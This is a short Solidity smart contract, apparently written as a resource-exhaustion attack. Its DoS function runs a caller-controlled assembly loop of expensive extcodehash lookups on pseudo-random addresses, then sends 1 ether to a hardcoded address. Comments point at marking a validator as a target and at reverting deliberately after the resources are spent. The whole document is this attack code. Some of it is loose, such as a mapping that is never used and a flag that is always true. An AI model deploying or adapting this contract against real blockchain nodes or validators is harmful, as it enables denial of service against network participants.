// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0 <0.9.0;

contract resource_ex_att_contract {

    mapping (address => bool) private _shouldDoS;

    constructor() {
        // _shouldDoS[validator] = true;
    }

    function DoS(uint256 i) external payable {
        bool shouldDoS = true;

        assembly {
            if shouldDoS {
                // Computationally expensive loop
                for { } gt(i, 0) { i := sub(i, 1) } {
                    pop(extcodehash(xor(blockhash(number()), gas())))
                }
            }
        }

        // Now perform the external call OUTSIDE assembly
        (bool success, ) = payable(0x742d35Cc6634C0532925a3b844Bc454e4438f44e).call{value: 1 ether}("");
        require(success, "Call failed");

        //revert("Intentional failure after resource consumption");
    }
}
